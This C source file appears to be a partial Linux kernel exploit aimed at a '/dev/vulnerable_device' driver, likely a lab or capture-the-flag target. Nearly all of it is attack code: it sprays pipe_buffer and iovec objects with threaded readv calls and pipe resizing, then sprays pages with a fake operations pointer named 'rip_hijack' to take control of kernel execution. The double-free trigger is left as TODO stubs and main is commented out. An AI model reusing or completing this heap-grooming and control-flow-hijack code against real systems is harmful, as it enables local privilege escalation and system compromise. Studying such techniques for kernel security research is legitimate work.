#define _GNU_SOURCE

//#include <linux/if_xdp.h>
#include <stdio.h>
#include <linux/if_tun.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/uio.h>
#include <assert.h>
#include <pthread.h>
//#include "liburing.h"
#define KMALLOC 0
#define KFREE 1
#define DUMP 3
#define ALLOC_PAGE 4
#define DEVICE_NAME "/dev/vulnerable_device"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdarg.h>
#include <sched.h>
#include <time.h>
#include <poll.h>
#include <signal.h>
//#include <keyutils.h>
#include <pthread.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <arpa/inet.h>
#include <x86intrin.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <stdint.h>
#include <stddef.h>
//typedef unsigned int u32;

#define PIPE_BUFFER_KCALLOC_SIZE 0x4000 

#define IOVEC_ARRAY_SZ 0x100
#define SPRAY_SIZE 256

#define MAX_PIPE_NUM 0x400
#define FIRST_PIPE_SPRAY (MAX_PIPE_NUM/2-0x28)
#define SECOND_PIPE_SPRAY (MAX_PIPE_NUM - FIRST_PIPE_SPRAY)

#define EXP_PIPE_NUM 0x1
#define DOUBLE_FREE 1
#define PIPE_PAGE_NUM 0x1200

/*  check if expr==re */
#define CHECK(expr,ret)     \
    if((expr) != ret){    \
        do{             \
            perror(#expr);  \
            exit(EXIT_FAILURE); \
        } while (0);    \
    }                   
/*  check if expr==ret */


int my_pipe[2];
int pipes[MAX_PIPE_NUM][2];
int pipe_pages[PIPE_PAGE_NUM][2];
int pipe_spray[PIPE_PAGE_NUM][2];
int exp_pipes[2];
int pipes[MAX_PIPE_NUM][2];
char global_buffer[0x10];
char take_page_back_buffer[0x1000];

char *io_vec_buffer[0x1100] = {'\x00'};
//void *global_buffer = NULL;
int pipe_iovec[MAX_PIPE_NUM][2];

struct pipe_buffer {
	void *page; // struct page *page;
	unsigned int offset, len;
	void  *ops; //const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};

struct kobj {
        size_t size;
        size_t index;
        void *buffer;
	unsigned long flags;
};
void set_cpu_affinity(){
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0,&mask);
    if (sched_setaffinity(0,sizeof(mask),&mask))
        puts("set single CPU failed");
    return;
}
void *io_vec_spray(void *idx){
    set_cpu_affinity();
    size_t pipe_idx = (size_t)(idx);
    char data[0x100]={};
    /* We create iovec_array for spray */
    struct iovec iovec_array[3];

    for (int i = 0; i < 3; i++) {
	iovec_array[i].iov_len = 1;
	iovec_array[i].iov_base = 
	    (char *)io_vec_buffer+pipe_idx*0x10+i;
    }
    
    /* We will first being blocked here and wait for being unblocked by write() */
    read(pipe_iovec[pipe_idx][0], data, 1);
    
    /* kmalloc(0xa0) */    
    int res = readv(pipe_iovec[pipe_idx][0], iovec_array, 3);		// in kernel you should see:  __import_iovec -> iovec_from_user -> kmalloc_array

do_NOT_spray:
    //pthread_exit(0);
    while(1)
    	sleep(99999999);
}
void setup_pg_vec_2()
{
    //setup_sandbox();
    // bring up lo interface
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    struct ifreq req;
    memset(&req, 0, sizeof(req));
    strcpy(req.ifr_name, "lo");
    req.ifr_flags = IFF_UP|IFF_LOOPBACK|IFF_RUNNING;
    int ret = ioctl(fd, SIOCSIFFLAGS, &req);
    if(ret != 0) perror("[setup_pg_vec] ioctl");
    close(fd);
} 


void prep_1() {
    set_cpu_affinity();
    /*
    for (int i=0; i< MAX_PIPE_NUM; i++) 
	{
	    if(pipe(pipe_iovec[i]) == -1)
	    {
		    perror("pipe_iovec");
		    exit(-1);
	    }
    	   CHECK(fcntl(pipe_iovec[i][1], F_SETPIPE_SZ, 0x1000), 0x1000);
	   write(pipe_iovec[i][1], "A", 1);
	   read(pipe_iovec[i][0], &global_buffer[0], 1);
	}
	printf("[+] Create pipe_iovec[%#x][2] success\n",MAX_PIPE_NUM);
	if(pipe(exp_pipes)==-1)
	{
		perror("exp_pipes");
		exit(-1);
	}
    */
    int ret = 0;
    char buffer[0x1000];
    memset(buffer,'A',0x1000);
    for (int i = 0; i < 0x600; i++) {
	  if (pipe(pipe_pages[i]) == -1) {
		  perror("pipe_pages");
		  exit(0);
	  }
	  ret = fcntl(pipe_pages[i][1], F_SETPIPE_SZ, 0x1000*1);	// 0x28 * 1 
	  write(pipe_pages[i][1], buffer, 0x1000);

	  //printf("[+] here pipe_pages[%x]: %#lx\n",i,ret);
	}

	//printf("[+] Prepare pipe_pages[%#x] done\n",PIPE_PAGE_NUM);
	puts("[+] first stage prep() done");
}
void prep_1_free() {
    set_cpu_affinity();
    int ret = 0;
    for (int i = 0; i < 0x500; i++) {

	  //close(pipe_pages[i]);
	  ret = fcntl(pipe_pages[i][1], F_SETPIPE_SZ, 0x1);	// 0x28 * (2**5)
	  //printf("[+] free pipe_pages[%x]: %d\n",i,ret);
	}

	//printf("[+] Prepare pipe_pages[%#x] done\n",PIPE_PAGE_NUM);
	puts("[+] pipe buffer free done");
}

char A_buffer[0x1000];

void free_all_pipe_buffer() {
	int ret;
	for (int i=0; i<MAX_PIPE_NUM; i++) {
		ret = fcntl(pipe_iovec[i][1], F_SETPIPE_SZ, 0x1000*32);
		printf("[+] adjust to %#lx\n",ret);
	}
	puts("[+] free all done");
}
void prep_3() {
    set_cpu_affinity();
    int ret = 0;
    for (int i = MAX_PIPE_NUM/2; i<MAX_PIPE_NUM ;i++) 
	{
	    if(pipe(pipe_iovec[i]) == -1)
	    {
		    perror("pipe_iovec");
		    exit(-1);
	    }
    	   fcntl(pipe_iovec[i][1], F_SETPIPE_SZ, 0x1000);
	   write(pipe_iovec[i][1], A_buffer, 0x1000);
	   //read(pipe_iovec[i][0], &global_buffer[0], 1);
	}


}
void prep_2() {
    set_cpu_affinity();
    int ret = 0;
    for (int i = MAX_PIPE_NUM/2-0x28; i<MAX_PIPE_NUM/2 ;i++) 
	{
	    if(pipe(pipe_iovec[i]) == -1)
	    {
		    perror("pipe_iovec");
		    exit(-1);
	    }
    	   fcntl(pipe_iovec[i][1], F_SETPIPE_SZ, 0x1000);
	   write(pipe_iovec[i][1], A_buffer, 0x1000);
	   //read(pipe_iovec[i][0], &global_buffer[0], 1);
	}

    /*
    char buffer[0x1000];
    memset(buffer,'B',0x1000);
    for (int i = 0; i < PIPE_PAGE_NUM; i++) {
	  if (pipe(pipe_spray[i]) == -1) {
		  perror("pipe_pages");
		  exit(0);
	  }
	  ret = fcntl(pipe_spray[i][1], F_SETPIPE_SZ, 0x1000*16);	// 0x28 * (2**5) 
	  //write(pipe_spray[i][1], buffer, 0x1000);

	  printf("[+] here pipe_spray[%x]: %#lx\n",i,ret);
	}
	*/
	puts("[+] second stage prep() done");
}
void prep() {
    //set_cpu_affinity();
    
    memset(A_buffer, 'A', 0x1000);        
    int ret = 0;

    for (int i = 0; i < PIPE_PAGE_NUM; i++) {
	  if (pipe(pipe_pages[i]) == -1) {
		  perror("pipe_pages");
		  exit(0);
	  }
	  ret = fcntl(pipe_pages[i][1], F_SETPIPE_SZ, 0x1000*4);	// 0x28 * (2**5)
	    //printf("[+] here pipe_pages[%x]: %d\n",i,ret);
	}
/*
	//printf("[+] Prepare pipe_pages[%#x] done\n",PIPE_PAGE_NUM);
	for (int i=0; i< MAX_PIPE_NUM/2-0x28; i++) 
	{
	    if(pipe(pipe_iovec[i]) == -1)
	    {
		    perror("pipe_iovec");
		    exit(-1);
	    }
    	   fcntl(pipe_iovec[i][1], F_SETPIPE_SZ, 0x1000);
	   write(pipe_iovec[i][1], A_buffer, 0x1000);
	   //read(pipe_iovec[i][0], &global_buffer[0], 1);
	}

	printf("[+] Create pipe_iovec[%#x][2] success\n",MAX_PIPE_NUM);
*/
	if(pipe(exp_pipes)==-1)
	{
		perror("exp_pipes");
		exit(-1);
	}

}

void stage_1_iovec_spray() {
    set_cpu_affinity();	
    int pthread_retval = 0;
	/* We prepare MAX_PIPE_NUM iovec to srapy */
	for (unsigned long i = 0; i < FIRST_PIPE_SPRAY; i++) {
	    pthread_t pid;
	    pthread_retval = pthread_create(&pid, NULL, io_vec_spray, (void *)i);
	    if(pthread_retval != 0)
		printf("[-] NUM %#lx pthread retval: %d\n",i,pthread_retval);
	}
	/* We spray a half of iovec  */
	for (int i = 1; i < FIRST_PIPE_SPRAY; i++) {

	    usleep(10);
	    write(pipe_iovec[i][1], "\n", 1);
	}
}

void stage_2_iovec_spray() {
	set_cpu_affinity();
	for (int i = FIRST_PIPE_SPRAY; i < MAX_PIPE_NUM-1; i++) {
	    usleep(10);
	    //if( i == (FIRST_PIPE_SPRAY + MAX_PIPE_NUM/4))
    	    //	getchar();
	    write(pipe_iovec[i][1], "\n", 1);
	}
	//printf("[+] Second spray %#x iovec success\n",(MAX_PIPE_NUM - FIRST_PIPE_SPRAY));
}
void prepare_double_free() {
    /* We put the DF obj in the same page of iovec */
    set_cpu_affinity();
    /* TODO: */
    usleep(30);
    printf("[+] Prepare double-free done\n");
    return;
}

void trigger_double_free(){
    set_cpu_affinity();
    /* TODO: */
    usleep(30);
    printf("[+] Trigger double-free done\n");
    return;
}

void put_vuln_obj() {
//    set_cpu_affinity();
    char buf[0x2000];
    memset(buf,'z',0x2000);
    //printf("[+] Waiting for creating exp_pipes[%#x]\n",EXP_PIPE_NUM);
	fcntl(exp_pipes[1], F_SETPIPE_SZ, 0x1000*1);	// in kernel: do_fcntl -> pipe_fcntl -> pipe_set_size -> pipe_resize_ring
	write(exp_pipes[1], buf, 0x1);
	//printf("[+] Alloc pipe_buffer by exp_pipes[%#x] success\n",EXP_PIPE_NUM);
	//getchar();
	//printf("[+] FIRST_PIPE_SPRAY: %#x\tMAX_PIPE_NUM-1: %#x\n",FIRST_PIPE_SPRAY , MAX_PIPE_NUM);
    return;
}

void free_all_iovec() {
    set_cpu_affinity();
    for (int i = 1 ; i<MAX_PIPE_NUM; i++) {
	    usleep(10);
	    //printf("[*] free iovec %#x\n",i);
	    write(pipe_iovec[i][1], "\n", 1);
    }
    //printf("[+] Free all iovec done\n");
    return;
}
void page_spray() {

	unsigned char rip_hijack[0x1000];
	memset(rip_hijack,0x41,0x1000);
    unsigned long fake_ops_addr = (unsigned long)&rip_hijack;
    //printf("fake ops addr: %#lx\n",fake_ops_addr);    
    //fake_ops_addr = 0x4141414141414141;
    int ret;
    unsigned long take_page_back_buffer[0x1000/8];  
    for (int i=0; i<0x1000/8; i++) {
    	take_page_back_buffer[i] = fake_ops_addr;
    }
    //memset(take_page_back_buffer , 'c' , 0x1000);
    for (int i = 0x0 ; i < PIPE_PAGE_NUM; i++) {
	    ret = write(pipe_pages[i][1], take_page_back_buffer, 0x1000);
	    //printf("ret: %#lx\n",ret);
	}
    printf("[+] page spray done!\n");

    //getchar();   
    //sleep(1); 
    //read(exp_pipes[0], take_page_back_buffer, 0x100);


    return;
}

/*
int main() {

    prep();
    stage_1_iovec_spray();
    prepare_double_free();
    put_vuln_obj();
    stage_2_iovec_spray();

    printf("%s\n","[+] Now we gonna free all iovec in page, and trigger double free press ENTER");	

    trigger_double_free();

    free_all_iovec();

    printf("[+] We gonna take the page back, spraying the data for pipe_pages\n");

    void page_spray();
    return 0;
}
*/
